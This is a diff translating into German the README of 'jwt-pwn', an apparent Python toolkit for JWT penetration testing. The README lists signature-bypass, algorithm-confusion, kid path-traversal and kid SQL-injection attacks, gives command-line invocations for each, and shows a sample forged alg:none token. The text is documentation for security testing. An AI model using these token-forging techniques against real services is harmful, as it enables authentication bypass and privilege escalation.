@@ -1,49 +1,49 @@
 # jwt-pwn
 
-A zero-dependency Python 3 toolkit for discovering and exploiting JWT vulnerabilities during web application penetration tests.
+Ein Python-3-Toolkit ohne externe Abhängigkeiten zum Aufspüren und Ausnutzen von JWT-Schwachstellen — gebaut für Penetrationstests an Webanwendungen.
 
-> **For authorized security testing only.** Only use against systems you own or have explicit written authorization to test.
+> **Nur für autorisierte Sicherheitstests.** Ausschließlich gegen Systeme einsetzen, die du selbst besitzt oder für die du eine ausdrückliche schriftliche Genehmigung hast.
 
-## Attacks Implemented
+## Implementierte Angriffe
 
-| Attack | CVE Class | Description |
-|--------|-----------|-------------|
-| `alg:none` | Signature bypass | Strips signature, sets `alg` to `none`/`None`/`NONE`/`nOnE` |
-| RS256→HS256 confusion | Algorithm confusion | Signs with HS256 using RSA public key as HMAC secret |
-| Claim tampering | Privilege escalation | Modifies `role`, `admin`, `exp`, `sub`, `iss` etc. |
-| `kid` path traversal | Key confusion | Sets `kid` to `/dev/null` → empty HMAC secret |
-| `kid` SQL injection | SQLI in header | Injects SQL payload into `kid` field |
-| HMAC brute-force | Weak secret | Wordlist attack against HS256/384/512 secrets |
+| Angriff | CVE-Klasse | Beschreibung |
+|---------|-----------|--------------|
+| `alg:none` | Signatur-Bypass | Entfernt die Signatur, setzt `alg` auf `none`/`None`/`NONE`/`nOnE` |
+| RS256→HS256 Confusion | Algorithm Confusion | Signiert mit HS256, verwendet den RSA Public Key als HMAC-Secret |
+| Claim Tampering | Privilege Escalation | Verändert `role`, `admin`, `exp`, `sub`, `iss` usw. |
+| `kid` Path Traversal | Key Confusion | Setzt `kid` auf `/dev/null` → leeres HMAC-Secret |
+| `kid` SQL Injection | SQLI im Header | Schleust SQL-Payload in das `kid`-Feld ein |
+| HMAC Brute-Force | Schwaches Secret | Wörterbuchangriff gegen HS256/384/512-Secrets |
 
-## Usage
+## Verwendung
 
 ```bash
-# Decode and inspect any JWT
+# JWT dekodieren und analysieren
 python jwt_pwn.py --decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
 
-# alg:none attack — generates 4 variants
+# alg:none-Angriff — erzeugt 4 Varianten
 python jwt_pwn.py --token eyJ... --alg-none
 
-# RS256 → HS256 confusion (supply the server's RSA public key)
+# RS256 → HS256 Confusion (RSA Public Key des Servers angeben)
 python jwt_pwn.py --token eyJ... --rs256-hs256 server_pubkey.pem
 
-# Tamper claims and re-sign (known secret)
+# Claims manipulieren und neu signieren (bekanntes Secret)
 python jwt_pwn.py --token eyJ... --tamper '{"role":"admin","exp":"+9999d"}' --secret weakpassword
 
-# kid path traversal → sign with empty key
+# kid Path Traversal → mit leerem Key signieren
 python jwt_pwn.py --token eyJ... --kid path_traversal
 
-# kid SQL injection
+# kid SQL Injection
 python jwt_pwn.py --token eyJ... --kid sql_injection
 
-# Brute-force HMAC secret
+# HMAC-Secret per Brute-Force knacken
 python jwt_pwn.py --token eyJ... --brute /usr/share/wordlists/rockyou.txt
 
-# JSON output for toolchain integration
+# JSON-Ausgabe für die Integration in andere Tools
 python jwt_pwn.py --token eyJ... --alg-none --json
 ```
 
-## Example: alg:none
+## Beispiel: alg:none
 
 ```
 [+] alg:none
@@ -55,7 +55,7 @@ python jwt_pwn.py --token eyJ... --alg-none --json
     token: eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
 ```
 
-## Example: Decoded JWT
+## Beispiel: Dekodierter JWT
 
 ```
 ── Header ──────────────────────────────
@@ -74,17 +74,17 @@ python jwt_pwn.py --token eyJ... --alg-none --json
 8a7f...
 ```
 
-## Requirements
+## Voraussetzungen
 
-Python 3.9+ — no external dependencies.
+Python 3.9+ — keine externen Abhängigkeiten.
 
-## References
+## Quellen & Referenzen
 
 - [PortSwigger: JWT attacks](https://portswigger.net/web-security/jwt)
 - [RFC 7519: JSON Web Token](https://tools.ietf.org/html/rfc7519)
-- [CVE-2015-9235: alg:none in multiple JWT libraries](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)
+- [CVE-2015-9235: alg:none in mehreren JWT-Bibliotheken](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)
 
-## License
+## Lizenz
 
 MIT License — Copyright (c) 2026 Yanis Ameseder
 
